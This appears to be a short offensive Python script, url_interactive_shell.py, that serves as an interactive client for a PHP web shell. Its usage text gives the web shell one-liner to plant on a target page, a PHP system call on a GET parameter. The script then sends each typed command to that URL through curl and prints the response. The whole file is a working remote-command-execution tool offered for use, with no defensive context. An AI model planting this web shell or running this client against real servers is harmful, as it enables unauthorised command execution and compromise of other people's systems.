import subprocess
import numpy as np
import sys

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESETALL = "\033[0m"
if len(sys.argv) != 2 or sys.argv[1][len(sys.argv[1])-1] != '=':
	print(bcolors.OKGREEN+"Usage:")
	print("		On the page put:" + bcolors.OKBLUE+bcolors.BOLD+"  <?php system($_GET['cmd']); ?>\n")
	print(bcolors.RESETALL+bcolors.OKGREEN+"		python3 url_interactive_shell.py http://IP:PORT/whatever.php?cmd=")
	print("")
	exit()

url = sys.argv[1]

while(True):
	print(bcolors.OKGREEN + bcolors.BOLD + " > "+bcolors.RESETALL, end="")
	command = input()
	if command == "exit":
		exit()
	curl = np.hstack(("curl","-s","-X","GET", (url+(command.replace(" ", "%20")) )))
	try:
		subprocess.call(curl)
	except:
		print(bcolors.FAIL + "Error")
